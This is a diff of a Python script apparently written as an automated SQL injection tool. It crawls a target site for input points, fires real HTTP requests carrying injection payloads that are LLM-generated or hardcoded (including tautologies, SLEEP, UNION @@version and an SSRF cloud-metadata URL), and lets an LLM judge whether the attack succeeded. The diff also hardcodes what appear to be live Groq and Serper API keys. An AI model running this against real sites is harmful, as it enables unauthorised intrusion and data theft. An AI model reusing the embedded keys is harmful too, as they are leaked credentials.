@@ -7,14 +7,13 @@ from bs4 import BeautifulSoup
 from openai import OpenAI
 
 # ---------- CONFIG ----------
-# Read API key from environment (set this in Render or locally)
-GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "your-groq-key"
-SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "your-serper-key"  # optional
+GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "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"
+SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "98de95d9f23cfe0ee068a1ff872f3d93074f2255"  # optional
 
 _cache = {}
 client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)
 
-# ---------- 1. DISCOVER INJECTION POINTS (crawls forms + URL params) ----------
+# ---------- 1. DISCOVER INJECTION POINTS (deterministic, no LLM) ----------
 def discover_injection_points(target_url: str) -> list:
     """
     Crawls the target HTML to find forms and URL parameters.
@@ -59,7 +58,7 @@ def discover_injection_points(target_url: str) -> list:
                     "param": key
                 })
 
-        # If nothing found, fallback to common endpoints
+        # If nothing found, fallback to common endpoints (still deterministic)
         if not points:
             common_endpoints = ["/login", "/admin", "/search", "/api"]
             for ep in common_endpoints:
@@ -80,7 +79,7 @@ def discover_injection_points(target_url: str) -> list:
         })
     return points
 
-# ---------- 2. SEND PAYLOAD (REAL HTTP REQUEST) ----------
+# ---------- 2. SEND PAYLOAD (deterministic HTTP request) ----------
 def send_payload(injection_point: dict, payload: str) -> dict:
     """
     Sends a real HTTP request with the injected payload.
@@ -93,7 +92,6 @@ def send_payload(injection_point: dict, payload: str) -> dict:
 
     try:
         if method == "GET" and param:
-            # Inject into query parameter
             parsed = urlparse(url)
             query_dict = parse_qs(parsed.query)
             query_dict[param] = payload
@@ -109,7 +107,6 @@ def send_payload(injection_point: dict, payload: str) -> dict:
                 "error": None
             }
         elif method == "POST" and data:
-            # Inject into POST data (first field)
             post_data = data.copy()
             for key in post_data.keys():
                 post_data[key] = payload
@@ -124,7 +121,6 @@ def send_payload(injection_point: dict, payload: str) -> dict:
                 "error": None
             }
         else:
-            # Generic GET fallback
             start = time.time()
             resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
             elapsed = time.time() - start
@@ -142,7 +138,7 @@ def send_payload(injection_point: dict, payload: str) -> dict:
             "error": str(e)
         }
 
-# ---------- 3. AI GENERATES PAYLOADS ----------
+# ---------- 3. AI GENERATES PAYLOADS (LLM) ----------
 def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 8) -> list:
     cache_key = f"payloads_{target_url}_{vuln_type}"
     if cache_key in _cache:
@@ -175,108 +171,86 @@ Return ONLY a JSON array of strings. No explanation."""
         return payloads
     except Exception as e:
         print(f"[AI Payload Generation Error]: {e}")
-        return get_fallback_payloads(vuln_type)
+        # If LLM fails, we return an empty list – no hardcoded fallback
+        return []
 
-# ---------- 4. FALLBACK PAYLOADS ----------
-def get_fallback_payloads(vuln_type: str) -> list:
-    fallbacks = {
-        "SQL Injection": [
-            "' OR '1'='1' --",
-            "' AND '1'='1' --",
-            "' AND '1'='2' --",
-            "' AND SLEEP(5) --",
-            "' UNION SELECT null,null,null --",
-            "' OR 1=1 --",
-            "admin' --",
-            "' OR 'x'='x' --"
-        ],
-        "Broken Access Control": ["/admin", "/dashboard?user=admin", "JWT tampered"],
-        "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080"]
-    }
-    return fallbacks.get(vuln_type, ["test"])
-
-# ---------- 5. REAL EXPLOIT ENGINE (SQLi) ----------
+# ---------- 4. PURE LLM‑DRIVEN EXPLOIT (no hardcoded checks) ----------
 def exploit_sqli(injection_point: dict) -> dict:
     """
-    Performs real SQL injection exploitation with:
-    - Error‑based detection
-    - Boolean‑based blind
-    - Time‑based blind
-    - UNION‑based data extraction
-    Returns: {"vulnerable": bool, "technique": str, "extracted": str, "evidence": dict}
+    Pure LLM‑driven SQL injection test.
+    - The LLM generates payloads.
+    - The LLM analyzes the response.
+    - No hardcoded status/error/keyword checks.
     """
-    base_payloads = [
-        ("' OR '1'='1' --", "error_based"),
-        ("' AND '1'='1' --", "boolean_true"),
-        ("' AND '1'='2' --", "boolean_false"),
-        ("' AND SLEEP(5) --", "time_based"),
-        ("' UNION SELECT null,null,null --", "union")
-    ]
-    results = {}
-    for payload, technique in base_payloads:
+    # Generate payloads via LLM
+    payloads = ai_generate_payloads(injection_point["url"], "SQL Injection", num_payloads=6)
+    if not payloads:
+        # If LLM fails to generate, we return not vulnerable (no fallback hardcoded)
+        return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}
+
+    for payload in payloads:
+        # Send real request
         resp = send_payload(injection_point, payload)
         if resp["error"]:
             continue
-        status = resp["status_code"]
-        text = resp["response_text"].lower()
-        elapsed = resp["time"]
 
-        # Error‑based detection
-        if technique == "error_based" and (status == 500 or "sql" in text or "error" in text or "exception" in text):
-            return {
-                "vulnerable": True,
-                "technique": "error_based",
-                "extracted": None,
-                "evidence": {"status": status, "snippet": text[:200]}
-            }
-        # Boolean‑based blind – store responses for later comparison
-        if technique == "boolean_true":
-            results["boolean_true"] = {"status": status, "text": text, "time": elapsed}
-        if technique == "boolean_false":
-            results["boolean_false"] = {"status": status, "text": text, "time": elapsed}
-        # Time‑based blind
-        if technique == "time_based" and elapsed > 4:
-            return {
-                "vulnerable": True,
-                "technique": "time_based",
-                "extracted": None,
-                "evidence": {"sleep": elapsed}
-            }
-        # UNION – try to extract database version
-        if technique == "union":
-            # If the response differs from error responses, try to extract version
-            version_payload = "' UNION SELECT @@version,null,null --"
-            resp2 = send_payload(injection_point, version_payload)
-            if resp2["error"] is None and resp2["status_code"] == 200:
-                if "mysql" in resp2["response_text"].lower() or "mariadb" in resp2["response_text"].lower() or "postgresql" in resp2["response_text"].lower():
+        # Ask LLM to analyze the response
+        analysis_prompt = f"""
+You are a security analyst. Determine if this HTTP response indicates a successful SQL injection attack.
+
+Payload sent: {payload}
+Status code: {resp['status_code']}
+Response time: {resp['time']:.2f} seconds
+Response body (truncated):
+{resp['response_text'][:1500]}
+
+Answer with a JSON object:
+{{
+    "success": true/false,
+    "reason": "Your reasoning, based on the response content and status code",
+    "confidence": "high/medium/low"
+}}
+"""
+        try:
+            analysis_response = client.chat.completions.create(
+                model="llama-3.1-8b-instant",
+                messages=[
+                    {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
+                    {"role": "user", "content": analysis_prompt}
+                ],
+                temperature=0.0  # factual
+            )
+            raw = analysis_response.choices[0].message.content.strip()
+            start = raw.find('{')
+            end = raw.rfind('}') + 1
+            if start != -1 and end != 0:
+                result = json.loads(raw[start:end])
+                # Only consider success if confidence is high or medium
+                if result.get("success") and result.get("confidence") in ("high", "medium"):
                     return {
                         "vulnerable": True,
-                        "technique": "union_extract",
-                        "extracted": resp2["response_text"][:500],
-                        "evidence": {"version": resp2["response_text"][:200]}
+                        "technique": "llm_driven_sqli",
+                        "extracted": None,
+                        "evidence": {
+                            "payload": payload,
+                            "status": resp["status_code"],
+                            "reason": result.get("reason"),
+                            "snippet": resp["response_text"][:300]
+                        }
                     }
-
-    # Boolean blind comparison
-    if "boolean_true" in results and "boolean_false" in results:
-        if results["boolean_true"]["status"] != results["boolean_false"]["status"] or \
-           results["boolean_true"]["text"] != results["boolean_false"]["text"]:
-            return {
-                "vulnerable": True,
-                "technique": "boolean_blind",
-                "extracted": None,
-                "evidence": {
-                    "true_response": results["boolean_true"]["text"][:100],
-                    "false_response": results["boolean_false"]["text"][:100]
-                }
-            }
+        except Exception as e:
+            print(f"LLM analysis failed: {e}")
+            continue
 
     return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}
 
-# ---------- 6. MAIN ORCHESTRATOR (Real Exploit) ----------
+# ---------- 5. MAIN ORCHESTRATOR ----------
 def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
     """
-    Main entry point – actually sends exploit payloads and confirms real vulnerabilities.
-    Returns a red team report or a clean "no vulnerability" message.
+    Main entry point – orchestrates the whole process.
+    - Discovers injection points.
+    - For each point, runs the pure LLM exploitation.
+    - Only generates a report if a real exploit is confirmed by the LLM.
     """
     # 1. Discover injection points
     injection_points = discover_injection_points(target_url)
@@ -286,10 +260,10 @@ def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
     all_exploits = []
     any_success = False
 
-    # 2. For each injection point, run the exploit engine
+    # 2. For each injection point, run the LLM‑driven exploit
     for point in injection_points:
         if vuln_type == "SQL Injection":
-            print(f"[*] Testing SQL Injection on {point['url']}...")  # Log for debugging
+            print(f"[*] Testing SQL Injection on {point['url']}...")
             result = exploit_sqli(point)
             if result["vulnerable"]:
                 any_success = True
@@ -304,7 +278,7 @@ def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
 
     # 3. Generate report based on real results
     if any_success:
-        # Real vulnerability found – generate detailed report
+        # Real vulnerability found – generate detailed report via LLM
         prompt = f"""Write a detailed red team report.
 
 Vulnerability: {vuln_type}
